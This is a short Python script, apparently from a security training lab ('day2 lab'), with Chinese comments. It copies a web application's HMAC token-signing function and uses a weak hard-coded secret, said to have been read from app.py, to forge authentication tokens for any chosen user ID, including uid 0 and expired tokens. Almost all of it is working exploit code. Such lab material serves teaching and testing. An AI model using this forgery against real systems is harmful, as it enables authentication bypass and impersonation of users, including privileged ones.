#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
按 day2 lab 源码里的 make_token 复刻签名，生成自定义 token。

对应源码：
    payload = {"uid": uid, "exp": int(time.time()) + ttl, "nonce": uuid.uuid4().hex}
    body = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")
    sig  = hmac.new(secret.encode(), body.encode(), hashlib.sha256).hexdigest()
    return f"{body}.{sig}"

用法：
    python3 forge.py            # 签 uid=1
    python3 forge.py 0          # 签 uid=0
    python3 forge.py 1 -60      # 签一个已过期的（ttl 传负数）
"""

import base64
import hashlib
import hmac
import json
import sys
import time
import uuid

SECRET = b"123456"          # 从 app.py 读到的弱密钥


def make_token(uid: int, ttl: int = 3600) -> str:
    payload = {
        "uid": uid,
        "exp": int(time.time()) + ttl,
        "nonce": uuid.uuid4().hex,
    }
    body = base64.urlsafe_b64encode(
        json.dumps(payload).encode()
    ).decode().rstrip("=")
    sig = hmac.new(SECRET, body.encode(), hashlib.sha256).hexdigest()
    return f"{body}.{sig}"


if __name__ == "__main__":
    uid = int(sys.argv[1]) if len(sys.argv) > 1 else 1
    ttl = int(sys.argv[2]) if len(sys.argv) > 2 else 3600
    print(make_token(uid, ttl))
